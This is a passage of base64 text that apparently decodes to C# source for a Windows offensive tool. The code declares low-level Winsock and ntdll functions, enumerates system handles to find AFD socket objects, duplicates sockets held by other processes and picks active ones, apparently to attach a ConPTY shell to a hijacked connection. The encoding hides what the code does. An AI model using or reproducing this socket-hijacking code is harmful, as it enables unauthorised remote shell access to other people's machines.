ibGljIFVJbnQzMiBSZWNlaXZlVGltZW91dDsKICAgICAgICBwdWJsaWMgVUludDMyIFJlY2VpdmVCdWZmZXJTaXplOwogICAgICAgIHB1YmxpYyBVSW50MzIgU2VuZEJ1ZmZlclNpemU7CiAgICAgICAgLyogVGhvc2UgYXJlIHRoZSBiaXRzIGluIHRoZSBTb2NrZXRQcm9lcnR5LCBwcm9wZXIgb3JkZXI6CiAgICAgICAgICAgIExpc3RlbmluZzsKICAgICAgICAgICAgQnJvYWRjYXN0OwogICAgICAgICAgICBEZWJ1ZzsKICAgICAgICAgICAgT29iSW5saW5lOwogICAgICAgICAgICBSZXVzZUFkZHJlc3NlczsKICAgICAgICAgICAgRXhjbHVzaXZlQWRkcmVzc1VzZTsKICAgICAgICAgICAgTm9uQmxvY2tpbmc7CiAgICAgICAgICAgIERvbnRVc2VXaWxkY2FyZDsKICAgICAgICAgICAgUmVjZWl2ZVNodXRkb3duOwogICAgICAgICAgICBTZW5kU2h1dGRvd247CiAgICAgICAgICAgIENvbmRpdGlvbmFsQWNjZXB0OwogICAgICAgICovCiAgICAgICAgcHVibGljIHVzaG9ydCBTb2NrZXRQcm9wZXJ0eTsKICAgICAgICAvLyBTbmFwc2hvdCBvZiBzZXZlcmFsIHBhcmFtZXRlcnMgcGFzc2VkIGludG8gV1NQU29ja2V0KCkgd2hlbiBjcmVhdGluZyB0aGlzIHNvY2tldAogICAgICAgIHB1YmxpYyBVSW50MzIgQ3JlYXRpb25GbGFnczsKICAgICAgICBwdWJsaWMgVUludDMyIENhdGFsb2dFbnRyeUlkOwogICAgICAgIHB1YmxpYyBVSW50MzIgU2VydmljZUZsYWdzMTsKICAgICAgICBwdWJsaWMgVUludDMyIFByb3ZpZGVyRmxhZ3M7CiAgICAgICAgcHVibGljIFVJbnQzMiBHcm91cElEOwogICAgICAgIHB1YmxpYyBBRkRfR1JPVVBfVFlQRSBHcm91cFR5cGU7CiAgICAgICAgcHVibGljIEludDMyIEdyb3VwUHJpb3JpdHk7CiAgICAgICAgLy8gTGFzdCBlcnJvciBzZXQgb24gdGhpcyBzb2NrZXQKICAgICAgICBwdWJsaWMgSW50MzIgTGFzdEVycm9yOwogICAgICAgIC8vIEluZm8gc3RvcmVkIGZvciBXU0FBc3luY1NlbGVjdCgpCiAgICAgICAgcHVibGljIEludFB0ciBBc3luY1NlbGVjdGhXbmQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBBc3luY1NlbGVjdFNlcmlhbE51bWJlcjsKICAgICAgICBwdWJsaWMgVUludDMyIEFzeW5jU2VsZWN0d01zZzsKICAgICAgICBwdWJsaWMgSW50MzIgQXN5bmNTZWxlY3RsRXZlbnQ7CiAgICAgICAgcHVibGljIEludDMyIERpc2FibGVkQXN5bmNTZWxlY3RFdmVudHM7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU09DS0FERFIKICAgIHsKICAgICAgICBwdWJsaWMgVUludDE2IHNhX2ZhbWlseTsKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gMTQpXQogICAgICAgIHB1YmxpYyBieXRlW10gc2FfZGF0YTsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBTT0NLRVRfQ09OVEVYVAogICAgewogICAgICAgIHB1YmxpYyBTT0NLX1NIQVJFRF9JTkZPIFNoYXJlZERhdGE7CiAgICAgICAgcHVibGljIFVJbnQzMiBTaXplT2ZIZWxwZXJEYXRhOwogICAgICAgIHB1YmxpYyBVSW50MzIgUGFkZGluZzsKICAgICAgICBwdWJsaWMgU09DS0FERFIgTG9jYWxBZGRyZXNzOwogICAgICAgIHB1YmxpYyBTT0NLQUREUiBSZW1vdGVBZGRyZXNzOwogICAgICAgIC8vIEhlbHBlciBEYXRhIC0gZm91bmQgb3V0IHdpdGggc29tZSByZXZlcnNpbmcKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gMjQpXQogICAgICAgIHB1YmxpYyBieXRlW10gSGVscGVyRGF0YTsKICAgIH0KCiAgICBwcml2YXRlIHN0cnVjdCBTT0NLRVRfQllURVNJTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgaGFuZGxlOwogICAgICAgIHB1YmxpYyBVSW50NjQgQnl0ZXNJbjsKICAgIH0KCgogICAgW0RsbEltcG9ydCgiV1MyXzMyLkRMTCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBXU0FEdXBsaWNhdGVTb2NrZXQoSW50UHRyIHNvY2tldEhhbmRsZSwgaW50IHByb2Nlc3NJZCwgcmVmIFdTQVBST1RPQ09MX0lORk8gcGlubmVkQnVmZmVyKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgV1NBU29ja2V0KFtJbl0gaW50IGFkZHJlc3NGYW1pbHksIFtJbl0gaW50IHNvY2tldFR5cGUsIFtJbl0gaW50IHByb3RvY29sVHlwZSwgcmVmIFdTQVBST1RPQ09MX0lORk8gbHBQcm90b2NvbEluZm8sIEludDMyIGdyb3VwMSwgaW50IGR3RmxhZ3MpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnQzMiBXU0FHZXRMYXN0RXJyb3IoKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgZ2V0cGVlcm5hbWUoSW50UHRyIHMsIHJlZiBTT0NLQUREUl9JTiBuYW1lLCByZWYgaW50IG5hbWVsZW4pOwoKICAgIC8vIFdTQUlvY3RsMSBpbXBsZW1lbnRhdGlvbiBzcGVjaWZpYyBmb3IgU0lPX1RDUF9JTkZPIGNvbnRyb2wgY29kZQogICAgW0RsbEltcG9ydCgiV3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUsIEVudHJ5UG9pbnQgPSAiV1NBSW9jdGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBXU0FJb2N0bDEoSW50UHRyIHMsIGludCBkd0lvQ29udHJvbENvZGUsIHJlZiBVSW50MzIgbHB2SW5CdWZmZXIsIGludCBjYkluQnVmZmVyLCBJbnRQdHIgbHB2T3V0QnVmZmVyLCBpbnQgY2JPdXRCdWZmZXIsIHJlZiBpbnQgbHBjYkJ5dGVzUmV0dXJuZWQsIEludFB0ciBscE92ZXJsYXBwZWQsIEludFB0ciBscENvbXBsZXRpb25Sb3V0aW5lKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IGNsb3Nlc29ja2V0KEludFB0ciBzKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgT3BlblByb2Nlc3MoaW50IHByb2Nlc3NBY2Nlc3MsIGJvb2wgYkluaGVyaXRIYW5kbGUsIGludCBwcm9jZXNzSWQpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBEdXBsaWNhdGVIYW5kbGUoSW50UHRyIGhTb3VyY2VQcm9jZXNzSGFuZGxlLCBJbnRQdHIgaFNvdXJjZUhhbmRsZSwgSW50UHRyIGhUYXJnZXRQcm9jZXNzSGFuZGxlLCBvdXQgSW50UHRyIGxwVGFyZ2V0SGFuZGxlLCB1aW50IGR3RGVzaXJlZEFjY2VzcywgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXSBib29sIGJJbmhlcml0SGFuZGxlLCB1aW50IGR3T3B0aW9ucyk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CgogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdWludCBOdFF1ZXJ5T2JqZWN0KEludFB0ciBvYmplY3RIYW5kbGUsIE9CSkVDVF9JTkZPUk1BVElPTl9DTEFTUyBpbmZvcm1hdGlvbkNsYXNzLCBJbnRQdHIgaW5mb3JtYXRpb25QdHIsIHVpbnQgaW5mb3JtYXRpb25MZW5ndGgsIHJlZiBpbnQgcmV0dXJuTGVuZ3RoKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbihpbnQgU3lzdGVtSW5mb3JtYXRpb25DbGFzcywgSW50UHRyIFN5c3RlbUluZm9ybWF0aW9uLCBpbnQgU3lzdGVtSW5mb3JtYXRpb25MZW5ndGgsIHJlZiBpbnQgcmV0dXJuTGVuZ3RoKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBVSW50MzIgV2FpdEZvclNpbmdsZU9iamVjdChJbnRQdHIgaEhhbmRsZSwgVUludDMyIGR3TWlsbGlzZWNvbmRzKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgTnRDcmVhdGVFdmVudChyZWYgSW50UHRyIEV2ZW50SGFuZGxlLCBpbnQgRGVzaXJlZEFjY2VzcywgSW50UHRyIE9iamVjdEF0dHJpYnV0ZXMsIGludCBFdmVudFR5cGUsIGJvb2wgSW5pdGlhbFN0YXRlKTsKCiAgICAvLyBOdERldmljZUlvQ29udHJvbEZpbGUxIGltcGxlbWVudGF0aW9uIHNwZWNpZmljIGZvciBJT0NUTF9BRkRfR0VUX0NPTlRFWFQgSW9Db250cm9sQ29kZQogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIiwgRW50cnlQb2ludCA9ICJOdERldmljZUlvQ29udHJvbEZpbGUiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgTnREZXZpY2VJb0NvbnRyb2xGaWxlMShJbnRQdHIgRmlsZUhhbmRsZSwgSW50UHRyIEV2ZW50LCBJbnRQdHIgQXBjUm91dGluZSwgSW50UHRyIEFwY0NvbnRleHQsIHJlZiBJT19TVEFUVVNfQkxPQ0sgSW9TdGF0dXNCbG9jaywgdWludCBJb0NvbnRyb2xDb2RlLCBJbnRQdHIgSW5wdXRCdWZmZXIsIGludCBJbnB1dEJ1ZmZlckxlbmd0aCwgcmVmIFNPQ0tFVF9DT05URVhUIE91dHB1dEJ1ZmZlciwgaW50IE91dHB1dEJ1ZmZlckxlbmd0aCk7CgogICAgW0RsbEltcG9ydCgiV3MyXzMyLmRsbCIpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IGlvY3Rsc29ja2V0KEludFB0ciBzLCBpbnQgY21kLCByZWYgaW50IGFyZ3ApOwogICAgCiAgICAvL2hlbHBlciBtZXRob2Qgd2l0aCAiZHluYW1pYyIgYnVmZmVyIGFsbG9jYXRpb24KICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb25EeW5hbWljKGludCBpbmZvQ2xhc3MsIGludCBpbmZvTGVuZ3RoKQogICAgewogICAgICAgIGlmIChpbmZvTGVuZ3RoID09IDApCiAgICAgICAgICAgIGluZm9MZW5ndGggPSAweDEwMDAwOwogICAgICAgIEludFB0ciBpbmZvUHRyID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwoaW5mb0xlbmd0aCk7CiAgICAgICAgd2hpbGUgKHRydWUpCiAgICAgICAgewogICAgICAgICAgICB1aW50IHJlc3VsdCA9ICh1aW50KU50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbihpbmZvQ2xhc3MsIGluZm9QdHIsIGluZm9MZW5ndGgsIHJlZiBpbmZvTGVuZ3RoKTsKICAgICAgICAgICAgaW5mb0xlbmd0aCA9IGluZm9MZW5ndGggKiAyOwogICAgICAgICAgICBpZiAocmVzdWx0ID09IE5UU1RBVFVTX1NVQ0NFU1MpCiAgICAgICAgICAgICAgICByZXR1cm4gaW5mb1B0cjsKICAgICAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChpbmZvUHRyKTsgIC8vZnJlZSBwb2ludGVyIHdoZW4gbm90IFN1Y2Nlc3NmdWwKICAgICAgICAgICAgaWYgKHJlc3VsdCAhPSBOVFNUQVRVU19JTkZPTEVOR1RITUlTTUFUQ0ggJiYgcmVzdWx0ICE9IE5UU1RBVFVTX0JVRkZFUk9WRVJGTE9XICYmIHJlc3VsdCAhPSBOVFNUQVRVU19CVUZGRVJUT09TTUFMTCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy90aHJvdyBuZXcgRXhjZXB0aW9uKCJVbmhhbmRsZWQgTnRTdGF0dXMgIiArIHJlc3VsdCk7CiAgICAgICAgICAgICAgICByZXR1cm4gSW50UHRyLlplcm87CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaW5mb1B0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGluZm9MZW5ndGgpOwogICAgICAgIH0KICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBJbnRQdHIgUXVlcnlPYmplY3RUeXBlc0luZm8oKQogICAgewogICAgICAgIEludFB0ciBwdHJPYmplY3RUeXBlc0luZm9ybWF0aW9uID0gSW50UHRyLlplcm87CiAgICAgICAgcHRyT2JqZWN0VHlwZXNJbmZvcm1hdGlvbiA9IE50UXVlcnlPYmplY3REeW5hbWljKEludFB0ci5aZXJvLCBPQkpFQ1RfSU5GT1JNQVRJT05fQ0xBU1MuT2JqZWN0QWxsVHlwZXNJbmZvcm1hdGlvbiwgMCk7CiAgICAgICAgcmV0dXJuIHB0ck9iamVjdFR5cGVzSW5mb3JtYXRpb247CiAgICB9CgogICAgLy8gdGhpcyBmcm9tIC0tPiBodHRwczovL2dpdGh1Yi5jb20vaGZpcmVmMHgvVUFDTUUvYmxvYi9tYXN0ZXIvU291cmNlL1NoYXJlZC9udG9zLmgKICAgIHByaXZhdGUgc3RhdGljIGxvbmcgQWxpZ25VcChsb25nIGFkZHJlc3MsIGxvbmcgYWxpZ24pCiAgICB7CiAgICAgICAgcmV0dXJuICgoKGFkZHJlc3MpICsgKGFsaWduKSAtIDEpICYgfigoYWxpZ24pIC0gMSkpOwogICAgfQoKICAgIC8vIHRoaXMgd29ya3Mgb25seSBmcm9tIHdpbjggYW5kIGFib3ZlLiBJZiB5b3UgbmVlZCBhIG1vcmUgZ2VuZXJpYyBzb2x1dGlvbiB5b3UgbmVlZCB0byB1c2UgdGhlIChpKzIpICJ3YXkiIG9mIGNvdW50aW5nIGluZGV4IHR5cGVzLgogICAgLy8gY3JlZGl0cyBmb3IgdGhpcyBnb2VzIHRvIEAweHJlcG56CiAgICAvLyBtb3JlIGluZm9ybWF0aW9uIGhlcmUgLS0+IGh0dHBzOi8vdHdpdHRlci5jb20vc3BsaW50ZXJfY29kZS9zdGF0dXMvMTQwMDg3MzAwOTEyMTAxMzc2NQogICAgcHJpdmF0ZSBzdGF0aWMgYnl0ZSBHZXRUeXBlSW5kZXhCeU5hbWUoc3RyaW5nIE9iamVjdE5hbWUpCiAgICB7CiAgICAgICAgYnl0ZSBUeXBlSW5kZXggPSAwOwogICAgICAgIGxvbmcgVHlwZXNDb3VudCA9IDA7CiAgICAgICAgSW50UHRyIHB0clR5cGVzSW5mbyA9IEludFB0ci5aZXJvOwogICAgICAgIHB0clR5cGVzSW5mbyA9IFF1ZXJ5T2JqZWN0VHlwZXNJbmZvKCk7CiAgICAgICAgVHlwZXNDb3VudCA9IE1hcnNoYWwuUmVhZEludFB0cihwdHJUeXBlc0luZm8pLlRvSW50NjQoKTsKICAgICAgICAvLyBjcmVhdGUgYSBwb2ludGVyIHRvIHRoZSBmaXJzdCBlbGVtZW50IGFkZHJlc3Mgb2YgT0JKRUNUX1RZUEVfSU5GT1JNQVRJT05fVjIKICAgICAgICBJbnRQdHIgcHRyVHlwZXNJbmZvQ3VycmVudCA9IG5ldyBJbnRQdHIocHRyVHlwZXNJbmZvLlRvSW50NjQoKSArIEludFB0ci5TaXplKTsKICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IFR5cGVzQ291bnQ7IGkrKykKICAgICAgICB7CiAgICAgICAgICAgIE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyIFR5cGUgPSAoT0JKRUNUX1RZUEVfSU5GT1JNQVRJT05fVjIpTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShwdHJUeXBlc0luZm9DdXJyZW50LCB0eXBlb2YoT0JKRUNUX1RZUEVfSU5GT1JNQVRJT05fVjIpKTsKICAgICAgICAgICAgLy8gbW92ZSBwb2ludGVyIHRvIG5leHQgdGhlIE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyIG9iamVjdAogICAgICAgICAgICBwdHJUeXBlc0luZm9DdXJyZW50ID0gKEludFB0cikocHRyVHlwZXNJbmZvQ3VycmVudC5Ub0ludDY0KCkgKyBBbGlnblVwKFR5cGUuVHlwZU5hbWUuTWF4aW11bUxlbmd0aCwgKGxvbmcpSW50UHRyLlNpemUpICsgTWFyc2hhbC5TaXplT2YodHlwZW9mKE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyKSkpOwogICAgICAgICAgICBpZiAoVHlwZS5UeXBlTmFtZS5MZW5ndGggPiAwICYmIE1hcnNoYWwuUHRyVG9TdHJpbmdVbmkoVHlwZS5UeXBlTmFtZS5CdWZmZXIsIFR5cGUuVHlwZU5hbWUuTGVuZ3RoIC8gMikgPT0gT2JqZWN0TmFtZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVHlwZUluZGV4ID0gVHlwZS5UeXBlSW5kZXg7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKHB0clR5cGVzSW5mbyk7CiAgICAgICAgcmV0dXJuIFR5cGVJbmRleDsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBMaXN0PEludFB0cj4gRHVwbGljYXRlU29ja2V0c0Zyb21IYW5kbGVzKExpc3Q8SW50UHRyPiBzb2NrZXRzKQogICAgewogICAgICAgIExpc3Q8SW50UHRyPiBkdXBlZFNvY2tldHNPdXQgPSBuZXcgTGlzdDxJbnRQdHI+KCk7CiAgICAgICAgaWYgKHNvY2tldHMuQ291bnQgPCAxKSByZXR1cm4gZHVwZWRTb2NrZXRzT3V0OwogICAgICAgIGZvcmVhY2ggKEludFB0ciBzb2NrIGluIHNvY2tldHMpCiAgICAgICAgewogICAgICAgICAgICBJbnRQdHIgZHVwZWRTb2NrZXQgPSBEdXBsaWNhdGVTb2NrZXRGcm9tSGFuZGxlKHNvY2spOwogICAgICAgICAgICBpZiAoZHVwZWRTb2NrZXQgIT0gSW50UHRyLlplcm8pIGR1cGVkU29ja2V0c091dC5BZGQoZHVwZWRTb2NrZXQpOwogICAgICAgIH0KICAgICAgICAvLyBjbGVhbmluZyBhbGwgc29ja2V0IGhhbmRsZXMKICAgICAgICBmb3JlYWNoIChJbnRQdHIgc29jayBpbiBzb2NrZXRzKQogICAgICAgICAgICBDbG9zZUhhbmRsZShzb2NrKTsKICAgICAgICByZXR1cm4gZHVwZWRTb2NrZXRzT3V0OwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIExpc3Q8SW50UHRyPiBGaWx0ZXJBbmRPcmRlclNvY2tldHNCeUJ5dGVzSW4oTGlzdDxJbnRQdHI+IHNvY2tldHMpCiAgICB7CiAgICAgICAgTGlzdDxTT0NLRVRfQllURVNJTj4gc29ja2V0c0J5dGVzSW4gPSBuZXcgTGlzdDxTT0NLRVRfQllURVNJTj4oKTsKICAgICAgICBMaXN0PEludFB0cj4gc29ja2V0c091dCA9IG5ldyBMaXN0PEludFB0cj4oKTsKICAgICAgICBmb3JlYWNoIChJbnRQdHIgc29jayBpbiBzb2NrZXRzKQogICAgICAgIHsKICAgICAgICAgICAgVENQX0lORk9fdjAgc29ja0luZm8gPSBuZXcgVENQX0lORk9fdjAoKTsKICAgICAgICAgICAgaWYgKCFHZXRTb2NrZXRUY3BJbmZvKHNvY2ssIG91dCBzb2NrSW5mbykpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGNsb3Nlc29ja2V0KHNvY2spOwogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBTb2NrZXQgaGFuZGxlIDB4IiArIHNvY2suVG9TdHJpbmcoIlg0IikgKyAiIGlzIGluIHRjcHN0YXRlICIgKyBzb2NrSW5mby5TdGF0ZS5Ub1N0cmluZygpKTsKICAgICAgICAgICAgLy8gd2UgbmVlZCBvbmx5IGFjdGl2ZSBzb2NrZXRzLCB0aGUgcmVtYWluZyBzb2NrZXRzIGFyZSBmaWx0ZXJlZCBvdXQKICAgICAgICAgICAgaWYgKHNvY2tJbmZvLlN0YXRlID09IFRjcFN0YXRlLlN5blJlY2VpdmVkIHx8IHNvY2tJbmZvLlN0YXRlID09IFRjcFN0YXRlLkVzdGFibGlzaGVkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBTT0NLRVRfQllURVNJTiBzb2NrQnl0ZXNJbiA9IG5ldyBTT0NLRVRfQllURVNJTigpOwogICAgICAgICAgICAgICAgc29ja0J5dGVzSW4uaGFuZGxlID0gc29jazsKICAgICAgICAgICAgICAgIHNvY2tCeXRlc0luLkJ5dGVzSW4gPSBzb2NrSW5mby5CeXRlc0luOwogICAgICAgICAgICAgICAgc29ja2V0c0J5dGVzSW4uQWRkKHNvY2tCeXRlc0luKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBjbG9zZXNvY2tldChzb2NrKTsKICAgICAgICB9CiAgICAgICAgaWYgKHNvY2tldHNCeXRlc0luLkNvdW50IDwgMSkgcmV0dXJuIHNvY2tldHNPdXQ7CiAgICAgICAgaWYgKHNvY2tldHNCeXRlc0luLkNvdW50ID49IDIpCiAgICAgICAgICAgIC8vIG9yZGVyaW5nIGZvciBmZXdlciBieXRlcyByZWNlaXZlZCBieSB0aGUgc29ja2V0cyB3ZSBoYXZlIGEgaGlnaGVyIGNoYW5jZSB0byBnZXQgdGhlIHByb3BlciBzb2NrZXQKICAgICAgICAgICAgc29ja2V0c0J5dGVzSW4uU29ydChkZWxlZ2F0ZSAoU09DS0VUX0JZVEVTSU4gYSwgU09DS0VUX0JZVEVTSU4gYikgeyByZXR1cm4gKGEuQnl0ZXNJbi5Db21wYXJlVG8oYi5CeXRlc0luKSk7IH0pOwogICAgICAgIGZvcmVhY2ggKFNPQ0tFVF9CWVRFU0lOIHNvY2tCeXRlc0luIGluIHNvY2tldHNCeXRlc0luKQogICAgICAgIHsKICAgICAgICAgICAgc29ja2V0c091dC5BZGQoc29ja0J5dGVzSW4uaGFuZGxlKTsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBTb2NrZXQgaGFuZGxlIDB4IiArIHNvY2tCeXRlc0luLmhhbmRsZS5Ub1N0cmluZygiWDQiKSArICIgdG90YWwgYnl0ZXMgcmVjZWl2ZWQ6ICIgKyBzb2NrQnl0ZXNJbi5CeXRlc0luLlRvU3RyaW5nKCkpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gc29ja2V0c091dDsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBib29sIEdldFNvY2tldFRjcEluZm8oSW50UHRyIHNvY2tldCwgb3V0IFRDUF9JTkZPX3YwIHRjcEluZm9PdXQpCiAgICB7CiAgICAgICAgaW50IHJlc3VsdCA9IC0xOwogICAgICAgIFVJbnQzMiB0Y3BJbmZvVmVyc2lvbiA9IDA7CiAgICAgICAgaW50IGJ5dGVzUmV0dXJuZWQgPSAwOwogICAgICAgIGludCB0Y3BJbmZvU2l6ZSA9IE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihUQ1BfSU5GT192MCkpOwogICAgICAgIEludFB0ciB0Y3BJbmZvUHRyID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwodGNwSW5mb1NpemUpOwogICAgICAgIHJlc3VsdCA9IFdTQUlvY3RsMShzb2NrZXQsIFNJT19UQ1BfSU5GTywgcmVmIHRjcEluZm9WZXJzaW9uLCBNYXJzaGFsLlNpemVPZih0Y3BJbmZvVmVyc2lvbiksIHRjcEluZm9QdHIsIHRjcEluZm9TaXplLCByZWYgYnl0ZXNSZXR1cm5lZCwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsKICAgICAgICBpZiAocmVzdWx0ICE9IDApCiAgICAgICAgewogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IFdTQUlvY3RsMSBmYWlsZWQgd2l0aCByZXR1cm4gY29kZSAiICsgcmVzdWx0LlRvU3RyaW5nKCkgKyAiIGFuZCB3c2FsYXN0ZXJyb3I6ICIgKyBXU0FHZXRMYXN0RXJyb3IoKS5Ub1N0cmluZygpKTsKICAgICAgICAgICAgdGNwSW5mb091dCA9IG5ldyBUQ1BfSU5GT192MCgpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIFRDUF9JTkZPX3YwIHRjcEluZm9WMCA9IChUQ1BfSU5GT192MClNYXJzaGFsLlB0clRvU3RydWN0dXJlKHRjcEluZm9QdHIsIHR5cGVvZihUQ1BfSU5GT192MCkpOwogICAgICAgIHRjcEluZm9PdXQgPSB0Y3BJbmZvVjA7CiAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbCh0Y3BJbmZvUHRyKTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvLyB0aGlzIGZ1bmN0aW9uIHRha2UgYSByYXcgaGFuZGxlIHRvIGEgXERldmljZVxBZmQgb2JqZWN0IGFzIGEgcGFyYW1ldGVyIGFuZCByZXR1cm5zIGEgaGFuZGxlIHRvIGEgZHVwbGljYXRlZCBzb2NrZXQKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBEdXBsaWNhdGVTb2NrZXRGcm9tSGFuZGxlKEludFB0ciBzb2NrZXRIYW5kbGUpCiAgICB7CiAgICAgICAgSW50UHRyIHJldFNvY2tldCA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBkdXBsaWNhdGVkU29ja2V0ID0gSW50UHRyLlplcm87CiAgICAgICAgV1NBUFJPVE9DT0xfSU5GTyB3c2FQcm90b2NvbEluZm8gPSBuZXcgV1NBUFJPVE9DT0xfSU5GTygpOwogICAgICAgIGludCBzdGF0dXMgPSBXU0FEdXBsaWNhdGVTb2NrZXQoc29ja2V0SGFuZGxlLCBQcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuSWQsIHJlZiB3c2FQcm90b2NvbEluZm8pOwogICAgICAgIGlmIChzdGF0dXMgPT0gMCkKICAgICAgICB7CiAgICAgICAgICAgIC8vIHdlIG5lZWQgYW4gb3ZlcmxhcHBlZCBzb2NrZXQgZm9yIHRoZSBjb25wdHkgcHJvY2VzcyBidXQgd2UgZG9uJ3QgbmVlZCB0byBzcGVjaWZ5IHRoZSBXU0FfRkxBR19PVkVSTEFQUEVEIGZsYWcgaGVyZSBiZWNhdXNlIGl0IHdpbGwgYmUgaWdub3JlZCAoYW5kIGF1dG9tYXRpY2FsbHkgc2V0KSBieSBXU0FTb2NrZXQoKSBmdW5jdGlvbiBpZiB3ZSBzZXQgdGhlIFdTQVBST1RPQ09MX0lORk8gc3RydWN0dXJlIGFuZCBpZiB0aGUgb3Jp